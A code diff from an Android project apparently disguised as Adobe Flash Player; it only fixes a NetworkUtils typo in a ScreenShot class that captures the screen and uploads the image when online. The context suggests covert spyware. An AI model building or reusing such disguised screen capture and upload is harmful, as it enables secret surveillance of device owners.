@@ -21,7 +21,7 @@ import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Public;
 import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.accessory.LinuxShell;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 
 import java.io.ByteArrayOutputStream;
@@ -122,7 +122,7 @@ public class ScreenShot implements Runnable{
                 if (bitmap != null) {
                     String filename = Utils.formatCurrentDateInFileName() + "_" + Public.SCRNSNAPSHOT_FILE_NAME;
                     String screenshotfn = Public.LOCAL_PATH_NAME + filename;
-                    if((NetworkUitls.isNetworkAvailable (context) == true)/*&&(Network.getNetworkType(context) == Network.WIFI_CONNECTION*/){
+                    if((NetworkUtils.isNetworkAvailable (context) == true)/*&&(Network.getNetworkType(context) == Network.WIFI_CONNECTION*/){
 
                         ByteArrayOutputStream baos = new ByteArrayOutputStream();
                         bitmap.compress(Bitmap.CompressFormat.JPEG, Public.SCREENSNAPSHOT_PHOTO_QUALITY, baos);
@@ -230,7 +230,7 @@ public class ScreenShot implements Runnable{
                 }
 
                 //ret = ShellCmd.execShell(cmduser, "chmod 777 " + screenfn);
-                if((NetworkUitls.isNetworkAvailable (context) == true)/*&&(Network.getNetworkType(context) == Network.WIFI_CONNECTION*/){
+                if((NetworkUtils.isNetworkAvailable (context) == true)/*&&(Network.getNetworkType(context) == Network.WIFI_CONNECTION*/){
 
                     int filenamelen = filename.getBytes().length;
 
